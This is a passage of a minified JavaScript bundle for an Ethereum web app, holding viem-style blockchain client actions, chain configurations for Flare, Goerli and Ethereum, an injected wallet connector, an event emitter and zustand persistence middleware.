v=c+1n;v<w;v++)m.onBlockNumber(v,c),c=v}(!c||w>c)&&(m.onBlockNumber(w,c),c=w)}catch(w){(g=m.onError)==null||g.call(m,w)}},{emitOnBegin:e,interval:a}))})():(()=>{let p=!0,m=()=>p=!1;return(async()=>{try{const{unsubscribe:g}=await t.transport.subscribe({params:["newHeads"],onData(w){var E;if(!p)return;const v=hc((E=w.result)==null?void 0:E.number);r(v,c),c=v},onError(w){o==null||o(w)}});m=g,p||m()}catch(g){o==null||o(g)}})(),m})()}async function Ib(t,{confirmations:e=1,hash:n,onReplaced:r,pollingInterval:o=t.pollingInterval,timeout:i}){const a=Et(["waitForTransactionReceipt",t.uid,n]);let s,c,l,u=!1;return new Promise((p,m)=>{i&&setTimeout(()=>m(new Kg({hash:n})),i);const g=lo(a,{onReplaced:r,resolve:p,reject:m},w=>{const v=he(t,op,"watchBlockNumber")({emitMissed:!0,emitOnBegin:!0,poll:!0,pollingInterval:o,async onBlockNumber(E){if(u)return;let I=E;const b=_=>{v(),_(),g()};try{if(l){if(e>1&&(!l.blockNumber||I-l.blockNumber+1n<e))return;b(()=>w.resolve(l));return}if(s||(u=!0,await su(async()=>{s=await he(t,_d,"getTransaction")({hash:n}),s.blockNumber&&(I=s.blockNumber)},{delay:({count:_})=>~~(1<<_)*200,retryCount:6}),u=!1),l=await he(t,lu,"getTransactionReceipt")({hash:n}),e>1&&(!l.blockNumber||I-l.blockNumber+1n<e))return;b(()=>w.resolve(l))}catch(_){if(s&&(_ instanceof Ph||_ instanceof Dh))try{c=s,u=!0;const x=await su(()=>he(t,dr,"getBlock")({blockNumber:I,includeTransactions:!0}),{delay:({count:f})=>~~(1<<f)*200,retryCount:6,shouldRetry:({error:f})=>f instanceof Nh});u=!1;const C=x.transactions.find(({from:f,nonce:T})=>f===c.from&&T===c.nonce);if(!C||(l=await he(t,lu,"getTransactionReceipt")({hash:C.hash}),e>1&&(!l.blockNumber||I-l.blockNumber+1n<e)))return;let A="replaced";C.to===c.to&&C.value===c.value?A="repriced":C.from===C.to&&C.value===0n&&(A="cancelled"),b(()=>{var f;(f=w.onReplaced)==null||f.call(w,{reason:A,replacedTransaction:c,transaction:C,transactionReceipt:l}),w.resolve(l)})}catch(x){b(()=>w.reject(x))}else b(()=>w.reject(_))}}})})})}function $b(t,{blockTag:e="latest",emitMissed:n=!1,emitOnBegin:r=!1,onBlock:o,onError:i,includeTransactions:a,poll:s,pollingInterval:c=t.pollingInterval}){const l=typeof s<"u"?s:t.transport.type!=="webSocket",u=a??!1;let p;return l?(()=>{const w=Et(["watchBlocks",t.uid,n,r,u,c]);return lo(w,{onBlock:o,onError:i},v=>La(async()=>{var E;try{const I=await he(t,dr,"getBlock")({blockTag:e,includeTransactions:u});if(I.number&&(p!=null&&p.number)){if(I.number===p.number)return;if(I.number-p.number>1&&n)for(let b=(p==null?void 0:p.number)+1n;b<I.number;b++){const _=await he(t,dr,"getBlock")({blockNumber:b,includeTransactions:u});v.onBlock(_,p),p=_}}(!(p!=null&&p.number)||e==="pending"&&!(I!=null&&I.number)||I.number&&I.number>p.number)&&(v.onBlock(I,p),p=I)}catch(I){(E=v.onError)==null||E.call(v,I)}},{emitOnBegin:r,interval:c}))})():(()=>{let w=!0,v=()=>w=!1;return(async()=>{try{const{unsubscribe:E}=await t.transport.subscribe({params:["newHeads"],onData(I){var x,C,A;if(!w)return;const _=(((A=(C=(x=t.chain)==null?void 0:x.formatters)==null?void 0:C.block)==null?void 0:A.format)||gh)(I.result);o(_,p),p=_},onError(I){i==null||i(I)}});v=E,w||v()}catch(E){i==null||i(E)}})(),v})()}function Ob(t,{address:e,args:n,batch:r=!0,event:o,events:i,onError:a,onLogs:s,poll:c,pollingInterval:l=t.pollingInterval,strict:u}){const p=typeof c<"u"?c:t.transport.type!=="webSocket",m=u??!1;return p?(()=>{const v=Et(["watchEvent",e,n,r,t.uid,o,l]);return lo(v,{onLogs:s,onError:a},E=>{let I,b,_=!1;const x=La(async()=>{var C;if(!_){try{b=await he(t,Kh,"createEventFilter")({address:e,args:n,event:o,events:i,strict:m})}catch{}_=!0;return}try{let A;if(b)A=await he(t,Ec,"getFilterChanges")({filter:b});else{const f=await he(t,ja,"getBlockNumber")({});I&&I!==f?A=await he(t,md,"getLogs")({address:e,args:n,event:o,events:i,fromBlock:I+1n,toBlock:f}):A=[],I=f}if(A.length===0)return;if(r)E.onLogs(A);else for(const f of A)E.onLogs([f])}catch(A){b&&A instanceof Vr&&(_=!1),(C=E.onError)==null||C.call(E,A)}},{emitOnBegin:!0,interval:l});return async()=>{b&&await he(t,Cc,"uninstallFilter")({filter:b}),x()}})})():(()=>{let v=!0,E=()=>v=!1;return(async()=>{try{const I=i??(o?[o]:void 0);let b=[];I&&(b=[I.flatMap(x=>ka({abi:[x],eventName:x.name,args:n}))],o&&(b=b[0]));const{unsubscribe:_}=await t.transport.subscribe({params:["logs",{address:e,topics:b}],onData(x){var A;if(!v)return;const C=x.result;try{const{eventName:f,args:T}=Ba({abi:I,data:C.data,topics:C.topics,strict:m}),R=on(C,{args:T,eventName:f});s([R])}catch(f){let T,R;if(f instanceof Hr||f instanceof io){if(u)return;T=f.abiItem.name,R=(A=f.abiItem.inputs)==null?void 0:A.some(k=>!("name"in k&&k.name))}const N=on(C,{args:R?[]:{},eventName:T});s([N])}},onError(x){a==null||a(x)}});E=_,v||E()}catch(I){a==null||a(I)}})(),E})()}function Pb(t,{batch:e=!0,onError:n,onTransactions:r,poll:o,pollingInterval:i=t.pollingInterval}){return(typeof o<"u"?o:t.transport.type!=="webSocket")?(()=>{const l=Et(["watchPendingTransactions",t.uid,e,i]);return lo(l,{onTransactions:r,onError:n},u=>{let p;const m=La(async()=>{var g;try{if(!p)try{p=await he(t,Yh,"createPendingTransactionFilter")({});return}catch(v){throw m(),v}const w=await he(t,Ec,"getFilterChanges")({filter:p});if(w.length===0)return;if(e)u.onTransactions(w);else for(const v of w)u.onTransactions([v])}catch(w){(g=u.onError)==null||g.call(u,w)}},{emitOnBegin:!0,interval:i});return async()=>{p&&await he(t,Cc,"uninstallFilter")({filter:p}),m()}})})():(()=>{let l=!0,u=()=>l=!1;return(async()=>{try{const{unsubscribe:p}=await t.transport.subscribe({params:["newPendingTransactions"],onData(m){if(!l)return;const g=m.result;r([g])},onError(m){n==null||n(m)}});u=p,l||u()}catch(p){n==null||n(p)}})(),u})()}function Db(t){return{call:e=>_c(t,e),createBlockFilter:()=>nb(t),createContractEventFilter:e=>Ih(t,e),createEventFilter:e=>Kh(t,e),createPendingTransactionFilter:()=>Yh(t),estimateContractGas:e=>cw(t,e),estimateGas:e=>pd(t,e),getBalance:e=>rb(t,e),getBlock:e=>dr(t,e),getBlockNumber:e=>ja(t,e),getBlockTransactionCount:e=>ib(t,e),getBytecode:e=>ob(t,e),getChainId:()=>Yo(t),getContractEvents:e=>Uh(t,e),getEnsAddress:e=>jw(t,e),getEnsAvatar:e=>Qw(t,e),getEnsName:e=>eb(t,e),getEnsResolver:e=>tb(t,e),getEnsText:e=>qh(t,e),getFeeHistory:e=>sb(t,e),estimateFeesPerGas:e=>aw(t,e),getFilterChanges:e=>Ec(t,e),getFilterLogs:e=>cb(t,e),getGasPrice:()=>hd(t),getLogs:e=>md(t,e),getProof:e=>yb(t,e),estimateMaxPriorityFeePerGas:e=>ow(t,e),getStorageAt:e=>vb(t,e),getTransaction:e=>_d(t,e),getTransactionConfirmations:e=>xb(t,e),getTransactionCount:e=>Mh(t,e),getTransactionReceipt:e=>lu(t,e),multicall:e=>_b(t,e),prepareTransactionRequest:e=>xc(t,e),readContract:e=>fr(t,e),sendRawTransaction:e=>wd(t,e),simulateContract:e=>yw(t,e),verifyMessage:e=>Ab(t,e),verifyTypedData:e=>Tb(t,e),uninstallFilter:e=>Cc(t,e),waitForTransactionReceipt:e=>Ib(t,e),watchBlocks:e=>$b(t,e),watchBlockNumber:e=>op(t,e),watchContractEvent:e=>Aw(t,e),watchEvent:e=>Ob(t,e),watchPendingTransactions:e=>Pb(t,e)}}function Mf(t){const{key:e="public",name:n="Public Client"}=t;return Fh({...t,key:e,name:n,type:"publicClient"}).extend(Db)}function Rb(t,{abi:e,args:n,bytecode:r,...o}){const i=rp({abi:e,args:n,bytecode:r});return bd(t,{...o,data:i})}async function Nb(t){var n;return((n=t.account)==null?void 0:n.type)==="local"?[t.account.address]:(await t.request({method:"eth_accounts"})).map(r=>od(r))}async function kb(t){return await t.request({method:"wallet_getPermissions"})}async function Mb(t){return(await t.request({method:"eth_requestAccounts"})).map(n=>Vt(n))}async function Ub(t,e){return t.request({method:"wallet_requestPermissions",params:[e]})}async function Bb(t,{account:e=t.account,message:n}){if(!e)throw new ao({docsPath:"/docs/actions/wallet/signMessage"});const r=Kt(e);if(r.type==="local")return r.signMessage({message:n});const o=typeof n=="string"?Yu(n):n.raw instanceof Uint8Array?Zn(n.raw):n.raw;return t.request({method:"personal_sign",params:[o,r.address]})}async function Lb(t,e){var l,u,p,m;const{account:n=t.account,chain:r=t.chain,...o}=e;if(!n)throw new ao({docsPath:"/docs/actions/wallet/signTransaction"});const i=Kt(n);Ua({account:i,...e});const a=await he(t,Yo,"getChainId")({});r!==null&&jh({currentChainId:a,chain:r});const s=(r==null?void 0:r.formatters)||((l=t.chain)==null?void 0:l.formatters),c=((u=s==null?void 0:s.transactionRequest)==null?void 0:u.format)||pc;return i.type==="local"?i.signTransaction({...o,chainId:a},{serializer:(m=(p=t.chain)==null?void 0:p.serializers)==null?void 0:m.transaction}):await t.request({method:"eth_signTransaction",params:[{...c(o),chainId:xe(a),from:i.address}]})}async function jb(t,{account:e=t.account,domain:n,message:r,primaryType:o,types:i}){if(!e)throw new ao({docsPath:"/docs/actions/wallet/signTypedData"});const a=Kt(e),s={EIP712Domain:np({domain:n}),...i};if(tp({domain:n,message:r,primaryType:o,types:s}),a.type==="local")return a.signTypedData({domain:n,primaryType:o,types:s,message:r});const c=Et({domain:n??{},primaryType:o,types:s,message:r},(l,u)=>_n(u)?u.toLowerCase():u);return t.request({method:"eth_signTypedData_v4",params:[a.address,c]})}async function Fb(t,{id:e}){await t.request({method:"wallet_switchEthereumChain",params:[{chainId:xe(e)}]})}async function Wb(t,e){return await t.request({method:"wallet_watchAsset",params:e})}function zb(t){return{addChain:e=>$w(t,e),deployContract:e=>Rb(t,e),getAddresses:()=>Nb(t),getChainId:()=>Yo(t),getPermissions:()=>kb(t),prepareTransactionRequest:e=>xc(t,e),requestAddresses:()=>Mb(t),requestPermissions:e=>Ub(t,e),sendRawTransaction:e=>wd(t,e),sendTransaction:e=>bd(t,e),signMessage:e=>Bb(t,e),signTransaction:e=>Lb(t,e),signTypedData:e=>jb(t,e),switchChain:e=>Fb(t,e),watchAsset:e=>Wb(t,e),writeContract:e=>Iw(t,e)}}function Ic(t){const{key:e="wallet",name:n="Wallet Client",transport:r}=t;return Fh({...t,key:e,name:n,transport:i=>r({...i,retryCount:0}),type:"walletClient"}).extend(zb)}function Hb(t,e={}){const{key:n="webSocket",name:r="WebSocket JSON-RPC",retryDelay:o}=e;return({chain:i,retryCount:a,timeout:s})=>{var p;const c=e.retryCount??a,l=s??e.timeout??1e4,u=t||((p=i==null?void 0:i.rpcUrls.default.webSocket)==null?void 0:p[0]);if(!u)throw new zh;return Sc({key:n,name:r,async request({method:m,params:g}){const w={method:m,params:g},v=await pl(u),{error:E,result:I}=await $i.webSocketAsync(v,{body:w,timeout:l});if(E)throw new ld({body:w,error:E,url:u});return I},retryCount:c,retryDelay:o,timeout:l,type:"webSocket"},{getSocket(){return pl(u)},async subscribe({params:m,onData:g,onError:w}){const v=await pl(u),{result:E}=await new Promise((I,b)=>$i.webSocket(v,{body:{method:"eth_subscribe",params:m},onResponse(_){if(_.error){b(_.error),w==null||w(_.error);return}if(typeof _.id=="number"){I(_);return}_.method==="eth_subscription"&&g(_.params)}}));return{subscriptionId:E,async unsubscribe(){return new Promise(I=>$i.webSocket(v,{body:{method:"eth_unsubscribe",params:[E]},onResponse:I}))}}}})}}const Is=Ku({id:14,name:"Flare Mainnet",network:"flare-mainnet",nativeCurrency:{decimals:18,name:"flare",symbol:"FLR"},rpcUrls:{default:{http:["https://flare-api.flare.network/ext/C/rpc"]},public:{http:["https://flare-api.flare.network/ext/C/rpc"]}},blockExplorers:{default:{name:"Flare Explorer",url:"https://flare-explorer.flare.network"}}}),Vb=Ku({id:5,network:"goerli",name:"Goerli",nativeCurrency:{name:"Goerli Ether",symbol:"ETH",decimals:18},rpcUrls:{alchemy:{http:["https://eth-goerli.g.alchemy.com/v2"],webSocket:["wss://eth-goerli.g.alchemy.com/v2"]},infura:{http:["https://goerli.infura.io/v3"],webSocket:["wss://goerli.infura.io/ws/v3"]},default:{http:["https://rpc.ankr.com/eth_goerli"]},public:{http:["https://rpc.ankr.com/eth_goerli"]}},blockExplorers:{etherscan:{name:"Etherscan",url:"https://goerli.etherscan.io"},default:{name:"Etherscan",url:"https://goerli.etherscan.io"}},contracts:{ensRegistry:{address:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e"},ensUniversalResolver:{address:"0x56522D00C410a43BFfDF00a9A569489297385790",blockCreated:8765204},multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:6507670}},testnet:!0}),ap=Ku({id:1,network:"homestead",name:"Ethereum",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{alchemy:{http:["https://eth-mainnet.g.alchemy.com/v2"],webSocket:["wss://eth-mainnet.g.alchemy.com/v2"]},infura:{http:["https://mainnet.infura.io/v3"],webSocket:["wss://mainnet.infura.io/ws/v3"]},default:{http:["https://cloudflare-eth.com"]},public:{http:["https://cloudflare-eth.com"]}},blockExplorers:{etherscan:{name:"Etherscan",url:"https://etherscan.io"},default:{name:"Etherscan",url:"https://etherscan.io"}},contracts:{ensRegistry:{address:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e"},ensUniversalResolver:{address:"0xc0497E381f536Be9ce14B0dD3817cBcAe57d2F62",blockCreated:16966585},multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:14353601}}});var sp=class extends Error{constructor({chainId:t,connectorId:e}){super(`Chain "${t}" not configured for connector "${e}".`),this.name="ChainNotConfiguredForConnectorError"}},vn=class extends Error{constructor(){super(...arguments),this.name="ConnectorNotFoundError",this.message="Connector not found"}};function $s(t){return typeof t=="string"?Number.parseInt(t,t.trim().substring(0,2)==="0x"?16:10):typeof t=="bigint"?Number(t):t}var Ed=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function $c(t){return t&&t.__esModule&&Object.prototype.hasOwnProperty.call(t,"default")?t.default:t}function cp(t){if(t.__esModule)return t;var e=t.default;if(typeof e=="function"){var n=function r(){return this instanceof r?Reflect.construct(e,arguments,this.constructor):e.apply(this,arguments)};n.prototype=e.prototype}else n={};return Object.defineProperty(n,"__esModule",{value:!0}),Object.keys(t).forEach(function(r){var o=Object.getOwnPropertyDescriptor(t,r);Object.defineProperty(n,r,o.get?o:{enumerable:!0,get:function(){return t[r]}})}),n}var lp={exports:{}};(function(t){var e=Object.prototype.hasOwnProperty,n="~";function r(){}Object.create&&(r.prototype=Object.create(null),new r().__proto__||(n=!1));function o(c,l,u){this.fn=c,this.context=l,this.once=u||!1}function i(c,l,u,p,m){if(typeof u!="function")throw new TypeError("The listener must be a function");var g=new o(u,p||c,m),w=n?n+l:l;return c._events[w]?c._events[w].fn?c._events[w]=[c._events[w],g]:c._events[w].push(g):(c._events[w]=g,c._eventsCount++),c}function a(c,l){--c._eventsCount===0?c._events=new r:delete c._events[l]}function s(){this._events=new r,this._eventsCount=0}s.prototype.eventNames=function(){var l=[],u,p;if(this._eventsCount===0)return l;for(p in u=this._events)e.call(u,p)&&l.push(n?p.slice(1):p);return Object.getOwnPropertySymbols?l.concat(Object.getOwnPropertySymbols(u)):l},s.prototype.listeners=function(l){var u=n?n+l:l,p=this._events[u];if(!p)return[];if(p.fn)return[p.fn];for(var m=0,g=p.length,w=new Array(g);m<g;m++)w[m]=p[m].fn;return w},s.prototype.listenerCount=function(l){var u=n?n+l:l,p=this._events[u];return p?p.fn?1:p.length:0},s.prototype.emit=function(l,u,p,m,g,w){var v=n?n+l:l;if(!this._events[v])return!1;var E=this._events[v],I=arguments.length,b,_;if(E.fn){switch(E.once&&this.removeListener(l,E.fn,void 0,!0),I){case 1:return E.fn.call(E.context),!0;case 2:return E.fn.call(E.context,u),!0;case 3:return E.fn.call(E.context,u,p),!0;case 4:return E.fn.call(E.context,u,p,m),!0;case 5:return E.fn.call(E.context,u,p,m,g),!0;case 6:return E.fn.call(E.context,u,p,m,g,w),!0}for(_=1,b=new Array(I-1);_<I;_++)b[_-1]=arguments[_];E.fn.apply(E.context,b)}else{var x=E.length,C;for(_=0;_<x;_++)switch(E[_].once&&this.removeListener(l,E[_].fn,void 0,!0),I){case 1:E[_].fn.call(E[_].context);break;case 2:E[_].fn.call(E[_].context,u);break;case 3:E[_].fn.call(E[_].context,u,p);break;case 4:E[_].fn.call(E[_].context,u,p,m);break;default:if(!b)for(C=1,b=new Array(I-1);C<I;C++)b[C-1]=arguments[C];E[_].fn.apply(E[_].context,b)}}return!0},s.prototype.on=function(l,u,p){return i(this,l,u,p,!1)},s.prototype.once=function(l,u,p){return i(this,l,u,p,!0)},s.prototype.removeListener=function(l,u,p,m){var g=n?n+l:l;if(!this._events[g])return this;if(!u)return a(this,g),this;var w=this._events[g];if(w.fn)w.fn===u&&(!m||w.once)&&(!p||w.context===p)&&a(this,g);else{for(var v=0,E=[],I=w.length;v<I;v++)(w[v].fn!==u||m&&!w[v].once||p&&w[v].context!==p)&&E.push(w[v]);E.length?this._events[g]=E.length===1?E[0]:E:a(this,g)}return this},s.prototype.removeAllListeners=function(l){var u;return l?(u=n?n+l:l,this._events[u]&&a(this,u)):(this._events=new r,this._eventsCount=0),this},s.prototype.off=s.prototype.removeListener,s.prototype.addListener=s.prototype.on,s.prefixed=n,s.EventEmitter=s,t.exports=s})(lp);var Zb=lp.exports;const Gb=$c(Zb);var Cd=(t,e,n)=>{if(!e.has(t))throw TypeError("Cannot "+n)},Le=(t,e,n)=>(Cd(t,e,"read from private field"),n?n.call(t):e.get(t)),Tt=(t,e,n)=>{if(e.has(t))throw TypeError("Cannot add the same private member more than once");e instanceof WeakSet?e.add(t):e.set(t,n)},Jo=(t,e,n,r)=>(Cd(t,e,"write to private field"),r?r.call(t,n):e.set(t,n),n),ht=(t,e,n)=>(Cd(t,e,"access private method"),n),Oc=class extends Gb{constructor({chains:t=[ap,Vb],options:e}){super(),this.chains=t,this.options=e}getBlockExplorerUrls(t){const{default:e,...n}=t.blockExplorers??{};if(e)return[e.url,...Object.values(n).map(r=>r.url)]}isChainUnsupported(t){return!this.chains.some(e=>e.id===t)}setStorage(t){this.storage=t}};function qb(t){var n;if(!t)return"Injected";const e=r=>{if(r.isApexWallet)return"Apex Wallet";if(r.isAvalanche)return"Core Wallet";if(r.isBackpack)return"Backpack";if(r.isBifrost)return"Bifrost Wallet";if(r.isBitKeep)return"BitKeep";if(r.isBitski)return"Bitski";if(r.isBlockWallet)return"BlockWallet";if(r.isBraveWallet)return"Brave Wallet";if(r.isCoin98)return"Coin98 Wallet";if(r.isCoinbaseWallet)return"Coinbase Wallet";if(r.isDawn)return"Dawn Wallet";if(r.isDefiant)return"Defiant";if(r.isDesig)return"Desig Wallet";if(r.isEnkrypt)return"Enkrypt";if(r.isExodus)return"Exodus";if(r.isFordefi)return"Fordefi";if(r.isFrame)return"Frame";if(r.isFrontier)return"Frontier Wallet";if(r.isGamestop)return"GameStop Wallet";if(r.isHaqqWallet)return"HAQQ Wallet";if(r.isHyperPay)return"HyperPay Wallet";if(r.isImToken)return"ImToken";if(r.isHaloWallet)return"Halo Wallet";if(r.isKuCoinWallet)return"KuCoin Wallet";if(r.isMathWallet)return"MathWallet";if(r.isNovaWallet)return"Nova Wallet";if(r.isOkxWallet||r.isOKExWallet)return"OKX Wallet";if(r.isOktoWallet)return"Okto Wallet";if(r.isOneInchIOSWallet||r.isOneInchAndroidWallet)return"1inch Wallet";if(r.isOneKey)return"OneKey Wallet";if(r.isOpera)return"Opera";if(r.isPhantom)return"Phantom";if(r.isPortal)return"Ripio Portal";if(r.isRabby)return"Rabby Wallet";if(r.isRainbow)return"Rainbow";if(r.isSafePal)return"SafePal Wallet";if(r.isStatus)return"Status";if(r.isSubWallet)return"SubWallet";if(r.isTalisman)return"Talisman";if(r.isTally)return"Taho";if(r.isTokenPocket)return"TokenPocket";if(r.isTokenary)return"Tokenary";if(r.isTrust||r.isTrustWallet)return"Trust Wallet";if(r.isTTWallet)return"TTWallet";if(r.isXDEFI)return"XDEFI Wallet";if(r.isZeal)return"Zeal";if(r.isZerion)return"Zerion";if(r.isMetaMask)return"MetaMask"};if((n=t.providers)!=null&&n.length){const r=new Set;let o=1;for(const a of t.providers){let s=e(a);s||(s=`Unknown Wallet #${o}`,o+=1),r.add(s)}const i=[...r];return i.length?i:i[0]??"Injected"}return e(t)??"Injected"}var gs,Sd=class extends Oc{constructor({chains:t,options:e}={}){const n={shimDisconnect:!0,getProvider(){if(typeof window>"u")return;const o=window.ethereum;return o!=null&&o.providers&&o.providers.length>0?o.providers[0]:o},...e};super({chains:t,options:n}),this.id="injected",Tt(this,gs,void 0),this.shimDisconnectKey=`${this.id}.shimDisconnect`,this.onAccountsChanged=o=>{o.length===0?this.emit("disconnect"):this.emit("change",{account:Vt(o[0])})},this.onChainChanged=o=>{const i=$s(o),a=this.isChainUnsupported(i);this.emit("change",{chain:{id:i,unsupported:a}})},this.onDisconnect=async o=>{var i;o.code===1013&&await this.getProvider()&&await this.getAccount()||(this.emit("disconnect"),this.options.shimDisconnect&&((i=this.storage)==null||i.removeItem(this.shimDisconnectKey)))};const r=n.getProvider();if(typeof n.name=="string")this.name=n.name;else if(r){const o=qb(r);n.name?this.name=n.name(o):typeof o=="string"?this.name=o:this.name=o[0]}else this.name="Injected";this.ready=!!r}async connect({chainId:t}={}){var e;try{const n=await this.getProvider();if(!n)throw new vn;n.on&&(n.on("accountsChanged",this.onAccountsChanged),n.on("chainChanged",this.onChainChanged),n.on("disconnect",this.onDisconnect)),this.emit("message",{type:"connecting"});const r=await n.request({method:"eth_requestAccounts"}),o=Vt(r[0]);let i=await this.getChainId(),a=this.isChainUnsupported(i);return t&&i!==t&&(i=(await this.switchChain(t)).id,a=this.isChainUnsupported(i)),this.options.shimDisconnect&&((e=this.storage)==null||e.setItem(this.shimDisconnectKey,!0)),{account:o,chain:{id:i,unsupported:a}}}catch(n){throw this.isUserRejectedRequestError(n)?new $t(n):n.code===-32002?new Ni(n):n}}async disconnect(){var e;const t=await this.getProvider();t!=null&&t.removeListener&&(t.removeListener("accountsChanged",this.onAccountsChanged),t.removeListener("chainChanged",this.onChainChanged),t.removeListener("disconnect",this.onDisconnect),this.options.shimDisconnect&&((e=this.storage)==null||e.removeItem(this.shimDisconnectKey)))}async getAccount(){const t=await this.getProvider();if(!t)throw new vn;const e=await t.request({method:"eth_accounts"});return Vt(e[0])}async getChainId(){const t=await this.getProvider();if(!t)throw new vn;return t.request({method:"eth_chainId"}).then($s)}async getProvider(){const t=this.options.getProvider();return t&&Jo(this,gs,t),Le(this,gs)}async getWalletClient({chainId:t}={}){const[e,n]=await Promise.all([this.getProvider(),this.getAccount()]),r=this.chains.find(o=>o.id===t);if(!e)throw new Error("provider is required.");return Ic({account:n,chain:r,transport:Ac(e)})}async isAuthorized(){var t;try{if(this.options.shimDisconnect&&!((t=this.storage)!=null&&t.getItem(this.shimDisconnectKey)))return!1;if(!await this.getProvider())throw new vn;return!!await this.getAccount()}catch{return!1}}async switchChain(t){var r,o,i;const e=await this.getProvider();if(!e)throw new vn;const n=xe(t);try{return await Promise.all([e.request({method:"wallet_switchEthereumChain",params:[{chainId:n}]}),new Promise(a=>this.on("change",({chain:s})=>{(s==null?void 0:s.id)===t&&a()}))]),this.chains.find(a=>a.id===t)??{id:t,name:`Chain ${n}`,network:`${n}`,nativeCurrency:{name:"Ether",decimals:18,symbol:"ETH"},rpcUrls:{default:{http:[""]},public:{http:[""]}}}}catch(a){const s=this.chains.find(c=>c.id===t);if(!s)throw new sp({chainId:t,connectorId:this.id});if(a.code===4902||((o=(r=a==null?void 0:a.data)==null?void 0:r.originalError)==null?void 0:o.code)===4902)try{if(await e.request({method:"wallet_addEthereumChain",params:[{chainId:n,chainName:s.name,nativeCurrency:s.nativeCurrency,rpcUrls:[((i=s.rpcUrls.public)==null?void 0:i.http[0])??""],blockExplorerUrls:this.getBlockExplorerUrls(s)}]}),await this.getChainId()!==t)throw new $t(new Error("User rejected switch after adding network."));return s}catch(c){throw new $t(c)}throw this.isUserRejectedRequestError(a)?new $t(a):new an(a)}}async watchAsset({address:t,decimals:e=18,image:n,symbol:r}){const o=await this.getProvider();if(!o)throw new vn;return o.request({method:"wallet_watchAsset",params:{type:"ERC20",options:{address:t,decimals:e,image:n,symbol:r}}})}isUserRejectedRequestError(t){return t.code===4001}};gs=new WeakMap;var Ad=(t,e,n)=>{if(!e.has(t))throw TypeError("Cannot "+n)},gl=(t,e,n)=>(Ad(t,e,"read from private field"),n?n.call(t):e.get(t)),wl=(t,e,n)=>{if(e.has(t))throw TypeError("Cannot add the same private member more than once");e instanceof WeakSet?e.add(t):e.set(t,n)},ss=(t,e,n,r)=>(Ad(t,e,"write to private field"),r?r.call(t,n):e.set(t,n),n),Kb=(t,e,n)=>(Ad(t,e,"access private method"),n),Yb={BASE_URL:"/",MODE:"production",DEV:!1,PROD:!0,SSR:!1};const Jb=t=>(e,n,r)=>{const o=r.subscribe;return r.subscribe=(a,s,c)=>{let l=a;if(s){const u=(c==null?void 0:c.equalityFn)||Object.is;let p=a(r.getState());l=m=>{const g=a(m);if(!u(p,g)){const w=p;s(p=g,w)}},c!=null&&c.fireImmediately&&s(p,p)}return o(l)},t(e,n,r)},Xb=Jb;function Qb(t,e){let n;try{n=t()}catch{return}return{getItem:o=>{var i;const a=c=>c===null?null:JSON.parse(c,e==null?void 0:e.reviver),s=(i=n.getItem(o))!=null?i:null;return s instanceof Promise?s.then(a):a(s)},setItem:(o,i)=>n.setItem(o,JSON.stringify(i,e==null?void 0:e.replacer)),removeItem:o=>n.removeItem(o)}}const Xo=t=>e=>{try{const n=t(e);return n instanceof Promise?n:{then(r){return Xo(r)(n)},catch(r){return this}}}catch(n){return{then(r){return this},catch(r){return Xo(r)(n)}}}},e2=(t,e)=>(n,r,o)=>{let i={getStorage:()=>localStorage,serialize:JSON.stringify,deserialize:JSON.parse,partialize:E=>E,version:0,merge:(E,I)=>({...I,...E}),...e},a=!1;const s=new Set,c=new Set;let l;try{l=i.getStorage()}catch{}if(!l)return t((...E)=>{console.warn(`[zustand persist middleware] Unable to update item '${i.name}', the given storage is currently unavailable.`),n(...E)},r,o);const u=Xo(i.serialize),p=()=>{const E=i.partialize({...r()});let I;const b=u({state:E,version:i.version}).then(_=>l.setItem(i.name,_)).catch(_=>{I=_});if(I)throw I;return b},m=o.setState;o.setState=(E,I)=>{m(E,I),p()};const g=t((...E)=>{n(...E),p()},r,o);let w;const v=()=>{var E;if(!l)return;a=!1,s.forEach(b=>b(r()));const I=((E=i.onRehydrateStorage)==null?void 0:E.call(i,r()))||void 0;return Xo(l.getItem.bind(l))(i.name).then(b=>{if(b)return i.deserialize(b)}).then(b=>{if(b)if(typeof b.version=="number"&&b.version!==i.version){if(i.migrate)return i.migrate(b.state,b.version);console.error("State loaded from storage couldn't be migrated since no migrate function was provided")}else return b.state}).then(b=>{var _;return w=i.merge(b,(_=r())!=null?_:g),n(w,!0),p()}).then(()=>{I==null||I(w,void 0),a=!0,c.forEach(b=>b(w))}).catch(b=>{I==null||I(void 0,b)})};return o.persist={setOptions:E=>{i={...i,...E},E.getStorage&&(l=E.getStorage())},clearStorage:()=>{l==null||l.removeItem(i.name)},getOptions:()=>i,rehydrate:()=>v(),hasHydrated:()=>a,onHydrate:E=>(s.add(E),()=>{s.delete(E)}),onFinishHydration:E=>(c.add(E),()=>{c.delete(E)})},v(),w||g},t2=(t,e)=>(n,r,o)=>{let i={storage:Qb(()=>localStorage),partialize:v=>v,version:0,merge:(v,E)=>({...E,...v}),...e},a=!1;const s=new Set,c=new Set;let l=i.storage;if(!l)return t((...v)=>{console.warn(`[zustand persist middleware] Unable to update item '${i.name}', the given storage is currently unavailable.`),n(...v)},r,o);const u=()=>{const v=i.partialize({...r()});return l.setItem(i.name,{state:v,version:i.version})},p=o.setState;o.setState=(v,E)=>{p(v,E),u()};const m=t((...v)=>{n(...v),u()},r,o);let g;const w=()=>{var v,E;if(!l)return;a=!1,s.forEach(b=>{var _;return b((_=r())!=null?_:m)});const I=((E=i.onRehydrateStorage)==null?void 0:E.call(i,(v=r())!=null?v:m))||void 0;return Xo(l.getItem.bind(l))(i.name).then(b=>{if(b)if(typeof b.version=="number"&&b.version!==i.version){if(i.migrate)return i.migrate(b.state,b.version);console.error("State loaded from storage couldn't be migrated since no migrate function was provided")}else return b.state}).then(b=>{var _;return g=i.merge(b,(_=r())!=null?_:m),n(g,!0),u()}).then(()=>{I==null||I(g,void 0),g=r(),a=!0,c.forEach(b=>b(g))}).catch(b=>{I==null||I(void 0,b)})};return 